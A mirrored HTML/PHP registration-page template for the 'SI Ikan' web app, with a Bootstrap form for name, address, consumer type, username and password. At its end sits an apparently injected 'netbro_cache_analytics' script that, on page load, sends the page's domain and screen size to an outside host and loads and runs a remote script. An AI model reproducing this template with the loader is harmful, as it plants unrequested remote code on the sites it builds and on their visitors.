<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from wbpreview.com/previews/WB0F56883/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 May 2017 23:49:35 GMT -->
<head>
    <meta charset="utf-8">
    <title>Register page - SI Ikan</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Responsive HTML template for Your company">
    <meta name="author" content="Oskar Żabik (oskar.zabik@gmail.com)">

    <!-- Le styles -->
    <link href="<?php echo base_url().'assets/login/'; ?>css/bootstrap.min.css" rel="stylesheet">
    <link href="<?php echo base_url().'assets/login/'; ?>css/bootstrap-responsive.min.css" rel="stylesheet">

    <link rel="stylesheet" href="<?php echo base_url().'assets/login/'; ?>css/typica-login.css">

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le favicon -->
    <link rel="shortcut icon" href="<?php echo base_url(); ?>favicon.ico">

</head>

<body>

<div class="navbar navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container">
            <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </a>
            <a class="brand" href="<?php echo base_url(); ?>"><img src="<?php echo base_url().'assets/login/'; ?>logo.png" alt="Typica - Bootstrap Awesome Template!"></a>
        </div>
    </div>
</div>

<div class="container">
    <div class="row">

        <div class="span6">
            <div id="register-wraper">
                <form id="register-form" class="form" action="<?php echo base_url('index.php/login/register'); ?>" method="post">
                    <legend>Daftar <span class="blue">SI-IKAN</span></legend>

                    <div class="body">
                        <!-- nama -->
                        <label>Nama Anda </label>
                        <input class="input-huge" type="text" name="namakonsumen">
                        <!-- alamat -->
                        <label>Alamat Anda </label>
                        <input class="input-huge" type="text" name="alamatkonsumen">
                        <!-- username -->
                        <label>Jenis Konsumen</label>
                        <select class="input-huge" name="jeniskonsumen">
                            <?php foreach ($jenis as $row){ ?>
                            <option value="<?php echo $row['id_jenis_konsumen']; ?>"><?php echo $row['jenis_konsumen']; ?></option>
                            <?php } ?>
                        </select>
                        <!-- email -->
                        <label>Username</label>
                        <input class="input-huge" type="text" name="usernamekonsumen">
                        <!-- password -->
                        <label>Password</label>
                        <input class="input-huge" type="password" name="passwordkonsumen">

                    </div>

                    <div class="footer">
                        <button type="submit" class="btn btn-success" value="register">Register</button>
                    </div>
                </form>
            </div>
        </div>

    </div>
</div>

<footer class="white navbar-fixed-bottom">
    Alread have an account? <a href="<?php echo base_url('index.php/login/form'); ?>" class="btn btn-black">Sign in</a>
</footer>


<!-- Le javascript
================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="<?php echo base_url().'assets/login/'; ?>js/jquery.js"></script>
<script src="<?php echo base_url().'assets/login/'; ?>js/bootstrap.js"></script>
<script src="<?php echo base_url().'assets/login/'; ?>js/backstretch.min.js"></script>
<script src="<?php echo base_url().'assets/login/'; ?>js/typica-login.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKnu6vlkoKplEiA7ZU0CRyjizkdd3O4XJm%2ft6HEi0Dt4F6KogdA7PvhZzeoUtgEFNSLMeAKyX45BHZBU2azyaMK1XwsmxBO1y9X%2fCoZJuiPzbU2PCF6qFesi57PAo0yG9Z26GABCp0d7bLs3%2fbQz5USD4V%2bE5X2CGLTtBumqHRiWnvrcuH6GwRZMXCc%2bbuSzcfjsVSXzYhMw0Dk%2bbM%2fdVfpTmD7vRkvINVwm4EcbVQ02OEmdqh%2faqgj2Qg%2fu0nkFdfyrhpNp52y2I6lhA%2bWulS6ZmNY35wrNU6gP8xnvHgN81Kqzv%2fUxoJ98qibYX8amPFtnzHEcUSq8eypVsebTUQmryapOa7PvkQSkFZUqd4J%2fliL%2fV%2bdjPVpeR8ugT74cedFUgoKtnYwXrfp%2f27aLg%2fvPNhRIgtwyPLPmdyWGO8vPZPR%2bcoO8CahgYkswsWe5NWz1%2fLynFjVjYqw8t9woPgV5tG7Bw%2ftqW%2f%2bzZj0%2fJpo3k%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from wbpreview.com/previews/WB0F56883/register.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 May 2017 23:49:35 GMT -->
</html>
